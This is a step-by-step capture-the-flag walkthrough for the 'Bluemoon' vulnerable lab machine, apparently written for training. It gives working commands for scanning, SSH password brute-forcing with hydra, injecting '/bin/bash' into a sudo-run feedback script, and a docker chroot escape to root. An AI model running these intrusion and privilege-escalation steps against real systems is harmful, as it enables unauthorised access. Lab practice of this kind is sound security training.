<H2>WEEK 2: BLUEMOON VULNERABILITY MACHINE</H2>

<H4>WALKTHROUGH</H4>

1. Run `ip a` command to check the attacker machine ip address. From here you will know the ip range for the victim machine.
2. Run `nmap -sn 192.168.56.0/24` to get the victim ip address. This is the ip range from the attacker ip address.
3. Run `gobuster dir -u http://192.168.56.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` to scan the victim directory and see the file.
4. After run, you should see `/hidden_text` under the list.
5. Type `192.168.56.103/hidden_text` and you will see a text in the page.
   <img width="663" height="216" alt="image" src="https://github.com/user-attachments/assets/9e6a9a37-5594-42bb-8f75-a7345720ab3b" />
   
6. Click on the `Thank You ...` text that in blue color. It will direct you to the QR code image.
7. Scan the QR code image to see the hidden text or credentials.
8. Connect to ftp using the credentials from QR code: `ftp 192.168.56.103`.
9. Run `ls -la` to list all the file
10. Get all the file such as information.txt and p_lists.txt using `get information.txt` and `get p_list.txt` then exit the ftp.
11. Check the currenct user which is Robin by run `cat information.txt` to see who is the user.
12. Find Robin's password by run `hydra -l robin -P p_lists.txt 192.168.56.103 ssh`. For your information, the `p_lists.txt` file are list of password.
13. After got the password, login as Robin using `ssh robin@192.168.56.103`.
14. Once logged in, check what you can run using Robin such as `sudo -l`.
15. This will shows after you run the command and you can change to user Jerry without using password
<img width="671" height="117" alt="image" src="https://github.com/user-attachments/assets/cb4f5e4f-36cf-43a0-aca3-f7834091fae6" />

16. Here you will exploit `feedback.sh` file as Jerry by run `sudo -u jerry /home/robin/project/feedback.sh`.
17. Then enter name: any name and feedback: `/bin/bash`.
18. If nothing shows, its works.
19. Then type whoami to make sure you are Jerry.
20. Run `ls -la` to list down all the file.
21. Grab `user.txt` by run cat /home/jerry/user.txt
22. Exploit root using command `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` and go to root folder `cd /root`.
23. List down the file `ls`.
24. Read the `root.txt`.
25. Congratulations, you reached the root and this will shows.
    <img width="347" height="311" alt="image" src="https://github.com/user-attachments/assets/374cbf7b-653b-4fb2-a3c6-5efb3285e224" />


